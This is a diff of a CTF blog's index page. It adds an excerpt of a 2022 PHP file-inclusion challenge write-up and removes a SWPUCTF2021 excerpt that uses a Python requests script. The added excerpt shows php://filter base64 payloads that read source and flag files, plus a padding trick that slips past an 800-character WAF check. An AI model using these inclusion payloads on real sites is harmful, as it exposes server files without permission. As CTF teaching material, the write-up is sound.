@@ -131,6 +131,44 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/07/11/鹏城杯2022-简单包含-wp/" >鹏城杯2022-简单包含-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-11
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2422">题目链接</a>   </p>
+<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line"><span class="comment">//flag in /var/www/html/flag.php;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="伪协议查看flag"><a href="#伪协议查看flag" class="headerlink" title="伪协议查看flag"></a>伪协议查看flag</h3><p>发现被过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看index源码"><a href="#查看index源码" class="headerlink" title="查看index源码"></a>查看index源码</h3><p>当输入长度小于800时 过滤flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ?flag=php://filter/convert.base64-encode/resource=index.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>)) &lt; <span class="number">800</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nssctf waf!&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="最后发送字符数-gt-800-然后查看flag"><a href="#最后发送字符数-gt-800-然后查看flag" class="headerlink" title="最后发送字符数&gt;800 然后查看flag"></a>最后发送字符数&gt;800 然后查看flag</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;flag=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/07/11/鹏城杯2022-简单包含-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/07/11/SWPUCTF2022-ezezphp-wp/" >SWPUCTF2022-ez_ez_php-wp</a>
 								</h3>
 							</div>
@@ -471,43 +509,6 @@ else show_source(__FILE__);
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/06/28/SWPUCTF2021-jicao-wp/" >SWPUCTF2021-jicao-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-06-28
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/384">题目链接</a><br>网页看到源代码，可知需要post id&#x3D;wllmNB; get json&#x3D;{x&#x3D;wllm}</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p>HackBar</p>
-<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/28/SWPUCTF2021-jicao-wp/0x1.png?raw=true" alt="img"></p>
-</li>
-<li><p>python</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">post_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;wllmNB&quot;</span>&#125;</span><br><span class="line">get_data = &#123;<span class="string">&quot;json&quot;</span>: <span class="string">&#x27;&#123;&quot;x&quot;:&quot;wllm&quot;&#125;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># params 为get数据,data为post数据</span></span><br><span class="line">response = requests.post(<span class="string">&quot;http://node2.anna.nssctf.cn:28110/&quot;</span>, data=post_data, params=get_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></li>
-</ol>
-
-	
-	</div>
-  <a type="button" href="/2023/06/28/SWPUCTF2021-jicao-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -557,6 +558,8 @@ else show_source(__FILE__);
 		
 			<li><a href="/categories/CVE/">CVE<span>12</span></a></li>
 		
+			<li><a href="/categories/Java/">Java<span>1</span></a></li>
+		
 			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
 		
 			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
@@ -580,45 +583,45 @@ else show_source(__FILE__);
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/javascript/">javascript<span>1</span></a></li>
+			<li><a href="/tags/天翼杯2021/">天翼杯2021<span>1</span></a></li>
 		
-			<li><a href="/tags/got/">got<span>3</span></a></li>
+			<li><a href="/tags/uaf/">uaf<span>2</span></a></li>
 		
-			<li><a href="/tags/php/">php<span>23</span></a></li>
+			<li><a href="/tags/swampctf2019/">swampctf2019<span>1</span></a></li>
 		
-			<li><a href="/tags/HGAME2023/">HGAME2023<span>2</span></a></li>
+			<li><a href="/tags/HNCTF2022/">HNCTF2022<span>2</span></a></li>
 		
-			<li><a href="/tags/GKCTF2021/">GKCTF2021<span>1</span></a></li>
+			<li><a href="/tags/CTF/">CTF<span>96</span></a></li>
 		
-			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
-		
-			<li><a href="/tags/jdbc/">jdbc<span>2</span></a></li>
-		
-			<li><a href="/tags/reverse-shell/">reverse shell<span>1</span></a></li>
-		
-			<li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
-		
-			<li><a href="/tags/NSS2022/">NSS2022<span>1</span></a></li>
-		
-			<li><a href="/tags/QEMU/">QEMU<span>1</span></a></li>
-		
-			<li><a href="/tags/伪协议/">伪协议<span>3</span></a></li>
-		
-			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
-		
-			<li><a href="/tags/5字符RCE/">5字符RCE<span>1</span></a></li>
-		
-			<li><a href="/tags/md5/">md5<span>1</span></a></li>
-		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
-		
-			<li><a href="/tags/HS2019/">HS2019<span>1</span></a></li>
+			<li><a href="/tags/pwn/">pwn<span>27</span></a></li>
 		
 			<li><a href="/tags/De1ctf2019/">De1ctf2019<span>1</span></a></li>
 		
-			<li><a href="/tags/sql/">sql<span>8</span></a></li>
+			<li><a href="/tags/flask-session/">flask session<span>3</span></a></li>
 		
-			<li><a href="/tags/csawquals2017/">csawquals2017<span>1</span></a></li>
+			<li><a href="/tags/无回显rce/">无回显rce<span>1</span></a></li>
+		
+			<li><a href="/tags/极客大挑战2020/">极客大挑战2020<span>1</span></a></li>
+		
+			<li><a href="/tags/watevrctf2019/">watevrctf2019<span>1</span></a></li>
+		
+			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/xss/">xss<span>1</span></a></li>
+		
+			<li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li>
+		
+			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/日志注入/">日志注入<span>1</span></a></li>
+		
+			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>3</span></a></li>
+		
+			<li><a href="/tags/upload/">upload<span>4</span></a></li>
+		
+			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/nightmare/">nightmare<span>11</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>129</span></a></li>
@@ -634,6 +637,10 @@ else show_source(__FILE__);
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2024/02/13/J-Mybatis/" ><i class="fa fa-file-o"></i>mybatis学习</a>
+      </li>
+    
+      <li>
         <a href="/2024/01/24/CISCN2023-DeserBug-wp/" ><i class="fa fa-file-o"></i>CISCN2023-DeserBug-wp</a>
       </li>
     
@@ -647,10 +654,6 @@ else show_source(__FILE__);
     
       <li>
         <a href="/2024/01/16/JNDI注入/" ><i class="fa fa-file-o"></i>JNDI注入</a>
-      </li>
-    
-      <li>
-        <a href="/2024/01/13/JDBC反序列化/" ><i class="fa fa-file-o"></i>JDBC反序列化</a>
       </li>
     
   </ul>
